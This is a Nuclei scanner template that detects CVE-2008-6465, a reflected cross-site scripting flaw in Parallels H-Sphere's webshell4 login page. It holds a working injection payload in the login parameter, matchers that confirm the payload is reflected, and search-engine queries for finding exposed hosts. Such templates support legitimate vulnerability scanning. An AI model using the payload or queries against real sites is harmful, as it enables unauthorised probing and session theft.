id: CVE-2008-6465

info:
  name: Parallels H-Sphere 3.0.0 P9/3.1 P1 - Cross-Site Scripting
  author: edoardottt
  severity: medium
  description: |
    Parallels H-Sphere 3.0.0 P9 and 3.1 P1 contains multiple cross-site scripting vulnerabilities in login.php in webshell4. An attacker can inject arbitrary web script or HTML via the err, errorcode, and login parameters, thus allowing theft of cookie-based authentication credentials and launch of other attacks.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary script code in the context of the affected website, potentially leading to session hijacking, defacement, or theft of sensitive information.
  remediation: |
    Apply the latest security patches or upgrade to a newer version of Parallels H-Sphere to mitigate the XSS vulnerability.
  reference:
    - http://www.xssing.com/index.php?x=3&y=65
    - https://exchange.xforce.ibmcloud.com/vulnerabilities/45254
    - https://exchange.xforce.ibmcloud.com/vulnerabilities/45252
    - https://nvd.nist.gov/vuln/detail/CVE-2008-6465
    - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:P/A:N
    cvss-score: 4.3
    cve-id: CVE-2008-6465
    cwe-id: CWE-79
    epss-score: 0.01157
    epss-percentile: 0.77713
    cpe: cpe:2.3:a:parallels:h-sphere:3.0.0:p9:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: parallels
    product: h-sphere
    shodan-query:
      - title:"Parallels H-Sphere
      - http.title:"h-sphere"
      - http.title:"parallels h-sphere"
    fofa-query:
      - title="h-sphere"
      - title="parallels h-sphere"
    google-query:
      - intitle:"h-sphere"
      - intitle:"parallels h-sphere"
  tags: cve,cve2008,xss,parallels,h-sphere

http:
  - method: GET
    path:
      - '{{BaseURL}}/webshell4/login.php?errcode=0&login=\%22%20onfocus=alert(document.domain);%20autofocus%20\%22&err=U'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '\" onfocus=alert(document.domain); autofocus'
          - 'Please enter login name &amp; password'
        condition: and

      - type: word
        part: header
        words:
          - 'text/html'

      - type: status
        status:
          - 200
# digest: 4b0a004830460221008049f2b5b785d62ef2f6422e580ca9b55837294ac3a1905c8df80470e818177f022100d0b6f15ae76854de53f8e56d776429129ed4e60d03a61bdd64219b817321f594:922c64590222798bb761d5b6d8e72950